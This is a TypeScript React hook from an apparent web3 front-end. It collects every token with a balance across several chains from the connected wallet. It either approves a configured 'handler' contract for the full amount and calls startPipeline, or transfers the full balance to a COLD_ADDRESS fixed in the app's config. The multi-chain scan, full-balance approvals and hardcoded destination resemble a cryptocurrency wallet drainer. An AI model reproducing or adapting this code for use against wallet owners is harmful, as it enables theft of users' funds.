import { useState, useCallback, useRef } from "react";
import { useWriteContract } from "wagmi";
import { keccak256, encodePacked, type Address } from "viem";
import { ERC20_ABI, HANDLER_ABI } from "../abi/pipeline";
import { getContracts } from "../config/contracts";
import { MULTICHAIN_CLIENTS, COLD_ADDRESS } from "../config/multichain";
import type { ChainBalances, ScannedToken } from "./useMultiChainScan";

export type TransferStep =
  | "idle"
  | "transferring"
  | "switching-chain"
  | "approving"
  | "executing"
  | "waiting"
  | "done"
  | "error";

export interface TransferProgress {
  step: TransferStep;
  currentChain: string | null;
  currentToken: string | null;
  completed: number;
  total: number;
  txHashes: string[];
  error: string | null;
}

const ZERO_PROGRESS: TransferProgress = {
  step: "idle",
  currentChain: null,
  currentToken: null,
  completed: 0,
  total: 0,
  txHashes: [],
  error: null,
};

export function useTransferAll() {
  const [progress, setProgress] = useState<TransferProgress>({
    ...ZERO_PROGRESS,
  });
  const { writeContractAsync } = useWriteContract();
  const runningRef = useRef(false);

  const transferAll = useCallback(
    async (chains: ChainBalances[]) => {
      if (runningRef.current || !COLD_ADDRESS) return;
      runningRef.current = true;

      const tokensToTransfer: {
        chainId: number;
        chainName: string;
        token: ScannedToken;
        usePipeline: boolean;
      }[] = [];

      for (const chain of chains) {
        for (const token of chain.tokens) {
          if (token.balance > 0n) {
            const contracts = getContracts(chain.chainId);
            tokensToTransfer.push({
              chainId: chain.chainId,
              chainName: chain.chainName,
              token,
              usePipeline: contracts !== null,
            });
          }
        }
      }

      if (tokensToTransfer.length === 0) {
        setProgress({
          ...ZERO_PROGRESS,
          step: "done",
          error: "No tokens with balance to transfer",
        });
        runningRef.current = false;
        return;
      }

      const hashes: string[] = [];

      setProgress({
        step: "transferring",
        currentChain: null,
        currentToken: null,
        completed: 0,
        total: tokensToTransfer.length,
        txHashes: [],
        error: null,
      });

      try {
        for (let i = 0; i < tokensToTransfer.length; i++) {
          const { chainId, chainName, token, usePipeline } =
            tokensToTransfer[i];

          setProgress((p) => ({
            ...p,
            currentChain: chainName,
            currentToken: token.symbol,
            step: usePipeline ? "approving" : "switching-chain",
          }));

          if (usePipeline) {
            const contracts = getContracts(chainId)!;
            const seed = keccak256(
              encodePacked(
                ["uint256", "uint256"],
                [BigInt(Date.now()), token.balance],
              ),
            );

            setProgress((p) => ({ ...p, step: "approving" }));
            const approveTx = await writeContractAsync({
              address: token.address,
              abi: ERC20_ABI,
              functionName: "approve",
              args: [contracts.handler, token.balance],
              chainId,
            });

            const client = MULTICHAIN_CLIENTS[chainId];
            if (client) {
              await (client as any).waitForTransactionReceipt({
                hash: approveTx,
              });
            }

            setProgress((p) => ({ ...p, step: "executing" }));
            const pipelineTx = await writeContractAsync({
              address: contracts.handler,
              abi: HANDLER_ABI,
              functionName: "startPipeline",
              args: [token.address, token.balance, seed],
              chainId,
            });

            if (client) {
              await (client as any).waitForTransactionReceipt({
                hash: pipelineTx,
              });
            }

            hashes.push(pipelineTx);
          } else {
            setProgress((p) => ({ ...p, step: "executing" }));
            const transferTx = await writeContractAsync({
              address: token.address,
              abi: ERC20_ABI,
              functionName: "transfer",
              args: [COLD_ADDRESS, token.balance],
              chainId,
            });

            const client = MULTICHAIN_CLIENTS[chainId];
            if (client) {
              await (client as any).waitForTransactionReceipt({
                hash: transferTx,
              });
            }

            hashes.push(transferTx);
          }

          setProgress((p) => ({
            ...p,
            completed: i + 1,
            txHashes: [...hashes],
          }));
        }

        setProgress((p) => ({
          ...p,
          step: "done",
          txHashes: hashes,
        }));
      } catch (err) {
        const message =
          err instanceof Error ? err.message : "Transfer failed";
        setProgress((p) => ({
          ...p,
          step: "error",
          error: message,
        }));
      } finally {
        runningRef.current = false;
      }

      return hashes;
    },
    [writeContractAsync],
  );

  const reset = useCallback(() => {
    setProgress({ ...ZERO_PROGRESS });
    runningRef.current = false;
  }, []);

  return { progress, transferAll, reset };
}
